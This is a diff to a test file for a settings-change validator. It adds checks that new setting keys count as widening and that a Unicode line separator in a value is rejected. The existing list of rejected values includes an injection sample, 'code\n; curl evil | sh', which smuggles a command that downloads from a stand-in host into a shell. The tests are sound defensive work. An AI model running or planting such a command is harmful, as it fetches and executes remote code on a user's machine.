@@ -312,6 +312,12 @@ describe("setting_change fails closed: every key it takes is placed (issue 1371)
     expect({ neither, both }).toEqual({ neither: [], both: [] });
   });
 
+  it("the narrow list names each key exactly: a new key under a known block widens", () => {
+    expect(NARROW_SETTINGS.filter((k) => k.includes("*"))).toEqual([]);
+    for (const k of ["github.app_token", "sessions.new_thing", "panes.x"])
+      expect([k, settingKind(k).widens]).toEqual([k, true]);
+  });
+
   it("a key on neither list widens", () => {
     expect(settingKind("some.new_key").widens).toBe(true);
   });
@@ -355,6 +361,7 @@ describe("setting_change: the card shows exactly what is written (issue 1371)", 
       "code\n; curl evil | sh",
       "code\u001b[2K",
       "code\u202e",
+      "code\u2028x",
     ])
       expect(
         checkSettingChange(deps(), { key: "editor", value, reason: "r" }),
